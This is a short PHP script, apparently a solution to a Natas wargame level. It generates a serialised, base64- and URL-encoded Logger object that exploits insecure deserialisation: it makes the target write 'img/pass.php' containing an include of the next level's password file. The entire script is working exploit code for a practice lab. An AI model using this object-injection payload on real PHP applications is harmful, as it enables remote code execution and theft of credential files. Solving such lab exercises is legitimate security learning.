<?php
	    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct(){
            // initialise variables
            $this->initMsg="";
            $this->exitMsg="<?php include('/etc/natas_webpass/natas27') ?>";
            $this->logFile = "img/pass.php";
		}
    }

	$logger = new Logger();

	$serialized = serialize($logger);
	echo $serialized;
	echo "\n";
	$encoded = base64_encode($serialized);
	echo $encoded;
	echo "\n";
	$url_encoded = urlencode($encoded);
	echo $url_encoded;
?>
